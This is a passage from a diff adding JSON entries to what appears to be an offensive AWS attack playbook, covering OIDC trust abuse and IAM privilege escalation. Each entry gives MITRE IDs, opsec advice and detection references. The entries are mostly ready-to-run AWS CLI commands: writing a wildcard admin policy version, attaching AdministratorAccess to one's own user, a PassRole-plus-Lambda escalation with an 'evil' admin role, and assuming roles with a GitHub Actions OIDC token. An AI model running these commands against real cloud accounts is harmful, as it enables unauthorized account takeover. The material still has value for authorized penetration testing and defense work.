+    "prerequisites": "Access to a trusted OIDC provider (GitHub Actions, Kubernetes service account, Google Workload Identity). Knowledge of the target IAM role ARN and trust policy conditions. Valid JWT from the trusted IdP.",
+    "detection_ref": "AWS Threats",
+    "commands": [
+      {
+        "description": "Enumerate IAM roles with OIDC trust relationships",
+        "method": "aws-cli",
+        "command": "aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Federated!=`null`]].[RoleName,Arn]' --output table"
+      },
+      {
+        "description": "Inspect OIDC trust policy for misconfiguration",
+        "method": "aws-cli",
+        "command": "aws iam get-role --role-name TARGET_ROLE --query 'Role.AssumeRolePolicyDocument'"
+      },
+      {
+        "description": "Assume role using OIDC web identity token (e.g. GitHub Actions JWT)",
+        "method": "aws-cli",
+        "command": "aws sts assume-role-with-web-identity --role-arn arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME --role-session-name pwned --web-identity-token $(cat /tmp/jwt_token)"
+      },
+      {
+        "description": "Enumerate permissions of the assumed role",
+        "method": "aws-cli",
+        "command": "AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY=<secret> AWS_SESSION_TOKEN=<token> aws sts get-caller-identity && aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCOUNT:role/ROLE --action-names '*'"
+      }
+    ]
+  },
+  "iam_privilege_escalation_paths": {
+    "description": "IAM privilege escalation via policy manipulation, PassRole+Lambda, and CreatePolicyVersion \u2014 turn limited access into AdministratorAccess.",
+    "mitre": "T1078.004",
+    "commands": [
+      {
+        "description": "Enumerate IAM permissions with Pacu",
+        "command": "# In Pacu shell:\nrun iam__enum_permissions\nrun iam__privesc_scan",
+        "method": "Pacu"
+      },
+      {
+        "description": "Create new IAM policy version with admin permissions",
+        "command": "aws iam create-policy-version --policy-arn arn:aws:iam::<ACCOUNT>:policy/TargetPolicy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' --set-as-default",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "Attach AdministratorAccess to own user (requires iam:AttachUserPolicy)",
+        "command": "aws iam attach-user-policy --user-name <YOUR_USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "PassRole + Lambda privesc \u2014 create function with admin role",
+        "command": "aws iam create-role --role-name evil-role --assume-role-policy-document file://trust.json\naws iam attach-role-policy --role-name evil-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws lambda create-function --function-name evil --runtime python3.11 --handler h.handler --role arn:aws:iam::<ACCT>:role/evil-role --zip-file fileb://evil.zip\naws lambda invoke --function-name evil /tmp/out.txt",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "Use enumerate-iam to discover all permissions",
+        "command": "python3 enumerate-iam.py --access-key AKIA... --secret-key ... --region us-east-1",
+        "method": "enumerate-iam"
+      },
+      {
+        "description": "Assume privileged role via sts:AssumeRole (misconfigured trust policy)",
+        "command": "aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT>:role/AdminRole --role-session-name pwned\nexport AWS_ACCESS_KEY_ID=...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...",
+        "method": "AWS CLI"
+      }
+    ],
+    "prerequisites": "Any IAM identity; at least one escalation-capable permission",
+    "opsec": "Use PMapper, Pacu, or AWSPX for automated escalation path analysis. Target shortest path to admin.",
+    "detection_ref": "IAM Access Analyzer; Pacu detection signatures; Prowler checks; IAM Permission Boundaries"
+  },
+  "oidc_sts_assume_role": {
+    "description": "Abuse misconfigured OIDC identity provider trust in IAM roles to assume privileged roles without AWS credentials by forging OIDC tokens from a trusted IdP",
+    "mitre": "T1550.001",
+    "prerequisites": "Access to a trusted OIDC IdP (GitHub Actions, GitLab, K8s service account); IAM role with overly permissive trust policy (e.g., missing sub condition)",
+    "opsec": "OIDC token exchange appears as legitimate AssumeRoleWithWebIdentity in CloudTrail. Attacker source IP will differ from expected CI/CD origin.",
+    "detection_ref": "CloudTrail: AssumeRoleWithWebIdentity events from unexpected source IPs or repositories; audit OIDC trust policies for missing sub/aud conditions",
+    "commands": [
+      {
+        "method": "aws-cli",
+        "description": "Assume role via OIDC token from CI/CD pipeline",
+        "command": "# GitHub Actions OIDC (in workflow context)\nOIDC_TOKEN=$(curl -H \"Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \\\n  \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com\" | jq -r .value)\n\n# Assume the vulnerable role\naws sts assume-role-with-web-identity \\\n  --role-arn 'arn:aws:iam::ACCOUNT_ID:role/GitHubActionsRole' \\\n  --role-session-name pwned \\\n  --web-identity-token \"$OIDC_TOKEN\" \\\n  --query 'Credentials'\n\n# Audit: check all roles with OIDC trust (no sub condition = wide-open)\naws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Federated]].[RoleName,Arn]'"
+      }
+    ]
+  }
+}
